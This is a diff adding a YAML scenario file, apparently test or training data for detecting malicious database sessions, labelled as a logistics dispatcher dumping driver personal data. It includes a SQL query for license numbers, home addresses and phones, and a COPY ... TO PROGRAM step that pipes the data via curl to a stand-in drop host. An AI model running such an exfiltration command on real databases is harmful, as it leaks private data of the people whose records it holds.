@@ -1,0 +1,22 @@
+scenario_id: logistics_dispatcher_pii_dump_0019
+family_id: logistics_dispatcher_pii_dump_0019
+domain: logistics
+time_of_day: '14:45'
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: pii_dump
+  role: dispatcher
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5385956152744473
+  events:
+  - sql: SELECT license_number, home_address, phone, full_name FROM drivers WHERE depot_id != 'DEPOT-COLD'
+  - step_id: exfil
+    sql: COPY (SELECT d.license_number, d.home_address, d.phone FROM drivers d) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'
+    connects_to:
+      ip: 203.0.113.42
+      port: 443
